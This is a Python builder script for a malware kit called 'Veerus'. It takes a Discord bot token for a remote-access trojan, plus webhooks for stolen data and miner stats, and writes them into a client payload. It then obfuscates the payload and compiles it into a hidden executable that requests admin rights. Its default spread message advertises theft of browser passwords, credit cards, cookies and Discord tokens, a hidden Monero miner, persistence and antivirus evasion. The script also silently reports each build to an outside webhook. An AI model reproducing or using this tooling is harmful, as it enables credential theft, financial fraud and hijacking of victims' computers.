import uuid
import base64
import hashlib
import os 
import pyImpossibleObf
import requests

key ="loooood"
discordbottoken = input("Discord Bot Token (For The Rat) : ")
if discordbottoken == "":
	discordbottoken = input("Discord Bot Token (For The Rat) Re-Enter: ")
webhook = input("Webhook : ")
webhookstats = input("XMR Miner Stats : Webhook : ")
if(webhookstats == ""):
	webhookstats == "NoWebhook"
processnumbers = input("Number of clones (default : 3) : ")
if processnumbers == "":
	processnumbers = "3"
dmallmsg = input("Dm All Message (press enter to leave default, that supports me a lot) : ")
if dmallmsg == "":
	dmallmsg = """:flag_gb: Hello !
Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same?
Let me explain what you can do with Veerus :
```Stealer :
	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
		Passwords, Credit Cards, Cookies, Autofill

	Discord :
		Token

	Miner :		
		Hidden XMR Miner
	Other :
		Add to computer startup the number of time you choosed.
		Clone the virus in random directories
		Undetected by Windows Defender & Windows Smart screen
		Anti Virtual Machine
		Disable Task Manager```

	Price : 0.00$ ! yes ! Totally Free !

	Links :
		Discord : https://discord.gg/7GkfBzRQXX
		Github : https://github.com/0xSxZ/Veerus
"""
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("webhook667", str(webhook)).replace("processnumbers", str(processnumbers)).replace("NoWebhook667EKIP", str(webhookstats)).replace(""":flag_gb: Hello !
Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
```Stealer :
	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
		Passwords, Credit Cards, Cookies, Autofill

	Discord :
		Token

	Miner :		
		Hidden XMR Miner
	Other :
		Add to computer startup the number of time you choosed.
		Clone the virus in random directories
		Undetected by Windows Defender & Windows Smart screen
		Anti Virtual Machine
		Disable Task Manager```

	Price : 0.00$ ! yes ! Totally Free !

	Links :
		Discord : https://discord.gg/7GkfBzRQXX
		Github : https://github.com/0xSxZ/Veerus""", dmallmsg).replace("BotTokenForTheRat667", discordbottoken)
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

import requests


datab = {
  "message":"New download Of Veerus !"
}
r = requests.post("https://webhook667.000webhostapp.com", data=datab)

print(r.text)
os.system(val + ' -m PyInstaller --onefile --uac-admin --noconsole client.py.hashed.py -i "NONE"')



